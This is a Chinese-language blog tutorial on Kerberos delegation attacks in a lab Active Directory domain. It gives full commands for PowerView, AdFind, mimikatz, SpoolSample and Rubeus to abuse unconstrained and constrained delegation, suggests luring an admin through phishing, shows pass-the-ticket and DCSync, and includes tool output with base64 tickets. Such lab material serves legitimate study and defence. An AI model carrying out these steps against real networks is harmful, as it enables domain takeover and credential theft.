---
title: 委派攻击
published: 2025-03-09 16:46:27
tags: [内网安全,域渗透]
category: 安全
draft: false
---

# 委派攻击

## 非约束性委派 **Unconstrained Delegation**

对于非约束性委派 （Unconstrained Delegation），**服务账号可以获取被委派用户的TGT，并将TGT缓存到LSASS进程中，从而服务账号可使用该TGT， 模拟该用户访问任意服务**。非约束委派的设置需要`SeEnableDelegation` 特权，该特权通常仅授予域管理员 。

配置了非约束性委派属性的机器账号的`userAccountControl`属性有个Flag位 WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION，其对应的数是0x81000=528384。

配置了非约束性委派属性的服务账号的`userAccountControl` 属性有个Flag位 NORMAL_ACCOUNT | TRUSTED_FOR_DELEGATION， 其对应的数是0x80200=524800。

### 查找非约束性委派的主机以及服务账户

通过PowerView.ps1

```bash
Import-Module .\PowerView.ps1
Get-NetComputer -unconstrained -Domain sunset.com
Get-NetUser -Unconstrained -Domain sunset.com | select name
```

通过ADFind

```bash
AdFind.exe -b "DC=sunset,DC=com" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName

AdFind.exe -b "DC=sunset,DC=com" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName
```

通过LDAPdump

### 利用

如果攻击者拿到了一台配置了非约束委派的机器权限，可以诱导管理员（社会工程、钓鱼邮件等等）来访问该机器，然后可以得到管理员的TGT（因为这台机器被配置为非约束委派，它有权保存访问它的用户的 TGT），从而模拟管理员访问任意服务，相当于拿下了整个域环境

当前主机`server01` 拥有`TRUSTED_FOR_DELEGATION`

![image.png](image%2035.png)

使用域管用户访问（社会工程学）`server01` 

![image.png](image%2036.png)

使用`mimikatz`导出票据（需要管理员用户）

![image.png](image%2037.png)

![image.png](image%2038.png)

将票据到入内存中，清除票据、PTT、查看导入的票据

```bash
kerberos::purge
kerberos::ptt <kirbi>
kerberos::list
```

![image.png](image%2039.png)

访问DC

![image.png](image%2040.png)

## 非约束委派 + spooler printer

通常非约束委派需要管理员访问，但是可以利用Spooler强制指定主机进行连接

1. 攻击者发现并破坏了具有 Kerberos 无约束委派的系统。请注意，如果攻击者破坏了受信任林（具有双向信任）中的域控制器，则可借此破坏其他林。
2. 攻击者测试并发现运行打印后台处理程序（Spooler）服务的域控制器。
3. 攻击者将 MS-RPRN 请求 `RpcRemoteFindFirstPrinterChangeNotification`（Kerberos 身份验证）发送到 DC 的打印服务器。
4. DC 立即向请求者发送响应。此响应涉及 DC 创建 Kerberos 服务票证 (TGS)，其中包含域控制器的计算机帐户 Ke​​rberos 身份验证票证 (TGT)，因为涉及 Kerberos 并且请求帐户配置了无约束委派。
5. 攻击者现在拥有域控制器计算机帐户 Ke​​rberos TGT，可用于模仿 DC。
6. DCSync所有帐户凭据（或根据需要涉及 DA 凭据的其他攻击）。

Spooler默认是开启的

![image.png](image%2041.png)

首先查看域内配置非约束委派主机，和上边一样，使用`ADFind`或者`Powerview`

查看域控是否运行`Spooler` ，可以使用`imparket`的`rpcdump`

```bash
 ⚡ root@kali  ~  rpcdump.py sunset.com -target-ip 192.168.111.167 | egrep 'MS-PAR|MS-RPRN'
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
```

使用`Rubes`监听来自域控的`4624`登录日志

```bash
Rubeus.exe monitor /interval:1 /filteruser:DC
```

![image.png](image%2042.png)

使用`SpoolSample.exe` 向域控发起请求，并强制域控向`server01`发起认证

```bash
Rubeus.exe monitor /inertval:1 /filteruse:DC$ > shell.txt
```

```bash
// 不一定要本机
SpoolSample.exe DC server01
```

![image.png](image%2043.png)

得到票据后将票据导入

```bash
Rubeus ptt /ticket:xxxx
```

![image.png](image%2044.png)

导入后查看可用票据，那么我们就拥有域控主机的`TGT`票据，域控计算机对计算机账户有`DCSync`权限

![image.png](image%2045.png)

使用`mimikatz`导出域内`HASH`

![image.png](image%2046.png)

| 方法 | 可用于 `dir \\DC\c$` | 可用于 DCSync | 关键区别 |
| --- | --- | --- | --- |
| **非约束委派 + Spooler** | ❌ 否 | ✅ 是 | TGT 仅限于被委派，不能用于 NTLM 认证（无法访问 SMB 共享） |
| **非约束委派 + 社会工程** | ✅ 是 | ✅ 是 | 通过交互式访问可能获得 NTLM 认证所需的凭据 |

## 约束委派

由于非约束委派的不安全性，微软在Server 2003中发布了受限约束委派

1. 配置了非约束性委派的机器账号的`userAccountControl`属性有个FLAG位 WORKSTATION_TRUST_ACCOUNT | TRUETED_TO_AUTHENTICATE_FOR_DELEGATION，其对应的数是0x1001000=16781312。
2. 配置了非约束性委派的服务账号的`userAccountControl`属性有个FLAG位 NORMAL_ACCOUNT | TRUETED_TO_AUTHENTICATE_FOR_DELEGATION，其对应的数是0x1000200=16777728。

### **查找约束委派的主机或服务账号**

使用`Powerview`

```bash
import-module 
get-domaincomputer -trustedtoauth -doamin sunset.com | select name
// 貌似这个也行
get-netcomputer -trustedtoauth -doamin sunset.com | select name
// 账号
Get-Domainuser -TrustedToAuth -domain sunset.com | select name
Get-netuser -TrustedToAuth -domain sunset.com | select name
```

使用`ADFind`

```bash
// 计算机
AdFind.exe -b "DC=sunset,DC=com" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
// 账户
AdFind.exe -b "DC=sunset,DC=com" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
```

或者使用`ldapdump`

### 利用环境

由于服务用户**只能获取某个用户（或主机）的服务的ST1而非TGT，所以只能模拟用户访问特定的服务**，但是如果能拿到约束委派用户（或主机）的密码或者Hash，就可以**伪造S4U的请求，伪装成服务用户以任意用户的权限申请访问指定服务的ST2**

域控 DC：`192.168.111.167`  受约束委派机器SERVER01：`192.168.111.151` 受委派域用户`wakaka`

首先将域控上将域用户`wakaka`组成成为SPN服务账号

![image.png](image%2047.png)

查看是否注册成功

![image.png](image%2048.png)

设置wakaka用户约束委派属性，可访问域控`cifs`服务

![image.png](image%2049.png)

查看`wakaka`账户flag（通过ADSI查看）

当被设置约束委派的时候会比非约束委派多一个属性：msDs-AllowedToDelegateTo

![image.png](image%2050.png)

并且userAccountControl的flag位为 `NORMAL_ACCOUNT | TRUETED_TO_AUTHENTICATE_FOR_DELEGATION`

![image.png](image%2051.png)

### 使用kekeo + mimikatz

当我们知道wakaka用户的明文密码或者hash的时候我们可以请求他的TGT

```bash
// 密码
tgt::ask /user:wakaka /domain:sunset.com /password:xxxxxx
// hash
tgt::ask /user:wakaka /domain:sunset.com /NTLM:xxxxxxxx
```

如果不知道该用户密码hash，如果有权限，也可以使用mimikatz将密码dunp下来也行

然后通过wakaka的TGT伪造S4U请求以administrator的身份访问域控cifs的ST

```bash
tgs::s4u /tgt:TGT_wakaka@SUNSET.COM_krbtgt~sunset.com@SUNSET.COM.kirbi /user:Administrator@sunset.com /service:cifs/DC.sunset.com
```

S4U2Self获取到的ST1以及S4U2Proxy获取到的域控CIFS服务的ST2会保存在当前目录下，然后我们用mimikatz将ST2导入当前会话即可

![image.png](image%2052.png)

使用mimikatz将ST票据导入

![image.png](image%2053.png)

访问域控

![image.png](image%2054.png)

### 使用 Rubeus

https://github.com/GhostPack/Rubeus?tab=readme-ov-file#s4u

使用asktgt获得wakaka用户TGT

```bash
Rubeus.exe asktgt /user:wakaka /password:xxxxx /domain:sunset.com /outfile:ticket.kirbi
```

通过`S4Uself`伪造administrator向wakaka请求，获得administrator的TGS

```bash
Rubeus.exe s4u /user:wakaka /ticket:ticket.kirbi /impersonateuser:administrator
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2 

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'wakaka@SUNSET.COM'
[*] Using domain controller: DC.sunset.com (192.168.111.167)
[*] Sending S4U2self request to 192.168.111.167:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'wakaka@SUNSET.COM'
[*] base64(ticket.kirbi):

      doIFNDCCBTCgAwIBBaEDAgEWooIEVjCCBFJhggROMIIESqADAgEFoQwbClNVTlNFVC5DT02iEzARoAMC
      AQGhCjAIGwZ3YWtha2GjggQeMIIEGqADAgEXoQMCAQKiggQMBIIECJMQBPsrbWB5s64loExC6tsgKS62
      FOSZVugqn0b+Ja/2d+KI4SpCDiFBzIkIboR4SYH/+1RM0L+L4MQgJS5jpJkYT6XmPaMROiE2CMc2zyv4
      lBfMZPlF2hATJxIJ9jXVfiD0k2XWytLzZLaaC+IJHSueW6YS9yMGcYLRD4F1BJ72W7QEye26eMJwE3uv
      hjppplkxdtIdQAUIwMqwDAPj9M9VLc7yOngOCLnPxHCfigMMvDBnANmP6fD1zpRmsbeTA7ZW0kNfnJv1
      4+N2UseUJGL7k/7BUIIZy5rfNZk3AsqBT13gbBUcfZBpxaNzY/Gq6BkhmZuejiImf2ZnLovJHIU6CCvq
      zm1yP12aV/RqEucwmSWu+UKvOQlGzITey2dcRp5/jffkvDvjKyuyDFZsgBjS3Mnc6g+SF0NFtPykJQ9S
      SpOtxNrMMbrqPhRUC02qMaDI/Obox3SdRZr2bPPFom+KtPTTy9i8kzalCgEUAGTfU7PUm7gxOtE9G4OL
      G9f8FK9jiPdrB4AF2gYSbK4JOF6HKUgrPZdu0kgs+uxyWL7DjXIkGjvT4wg0B3/+J13RGz4fmd1kfkCB
      goIpPn3PtN/bdrP8Grwbg34/aWc+CvZadlWcBqsYDOUItL8VXL7K4SUobkVlAVpSTYBuvUAi3mvX0fSh
      JZSFz0moRKUDYwuIAxboHE4EYBDUJB0onCecFUWXOJ8sDCLJcQ0x9kcS6iTzaTepf57WZGPYjSDFs15v
      3PPsLNoAGSxr9VWXkDwZbVi8iDDIkmzCeMRr9nvVQ5VJJg+DF1k2pvuxIJA8SGznxAEI2cuxqzAia1eH
      4KB5o0YcSkSrcni8sIVMuPhMqWsgApngL/ZMs/NCwGbc2ZhzksPjeGTICo5bKiIwLVt4rdl5jkiikFYa
      2YWV2/aWqZsIknNQWsuC0Oie7UCZJrWfwLdav58JSuWxMhM23cFxR3bH3tFfjwRZWZx7JG4NGmKpCO+i
      uaD8/DNUxYw4Y2yBJrY79Gcdfuwuhzd4kXUATiqXoA88gIsNIbsFQ1mmdmIz4dtDDUGXcJFJ09wvzmT0
      95uLQSQJTJbpyRr9mGzlpHICQFSHaenw4m7m9Tf/nPQ51rAI+lo4WvKqnBvtLSFi//0GQZEiEKN1+7AJ
      B0ktX4ak5NRwNP1OUyLax2Zv5ei+E763S7Zw7hlhMG+3Uquxyk4pn/EGA7LtRT7jz5gqvAhb8eIE37v2
      2gGAgh1NDL4dYjU9gUMtDUTA0yDZEgSC9WKof91pzqbEE/ZCmX41++0NNde8pXXhHNGetTfbTHslOxyP
      VCuKNwRtdlBD11DQLTd/R0HKVsysG2vLBzKfiVkJSXCHOwFDa+oOHzWFUQnZ3B70oMAEyaOByTCBxqAD
      AgEAooG+BIG7fYG4MIG1oIGyMIGvMIGsoBswGaADAgEXoRIEEESMbWs9/qolsG0M71JnzZ2hDBsKU1VO
      U0VULkNPTaIaMBigAwIBCqERMA8bDWFkbWluaXN0cmF0b3KjBwMFAEChAAClERgPMjAyNTAzMDIwNjM3
      NTFaphEYDzIwMjUwMzAyMTYzMzAyWqcRGA8yMDI1MDMwOTA2MzMwMlqoDBsKU1VOU0VULkNPTakTMBGg
      AwIBAaEKMAgbBndha2FrYQ==

```

再通过S4Uproxy

```bash
Rubeus.exe s4u /ticket:ticket.kirbi /msdsspn:"cifs/DC.sunset.com" /tgs:tgs..... /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2 

[*] Action: S4U

[*] Action: S4U

[*] Loaded a TGS for SUNSET.COM\administrator
[*] Impersonating user 'administrator' to target SPN 'cifs/DC.sunset.com'
[*] Building S4U2proxy request for service: 'cifs/DC.sunset.com'
[*] Using domain controller: DC.sunset.com (192.168.111.167)
[*] Sending S4U2proxy request to domain controller 192.168.111.167:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/DC.sunset.com':
[+] Ticket successfully imported!

      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
      aWZzGw1EQy5zdW5zZXQuY29t
```

访问域控

![image.png](image%2055.png)

一键导入

```bash
Rubeus.exe s4u /user:wakaka /ticket:ticket.kirbi /impersonateuser:administrator /msdsspn:"cifs/DC.sunset.com" /ptt
```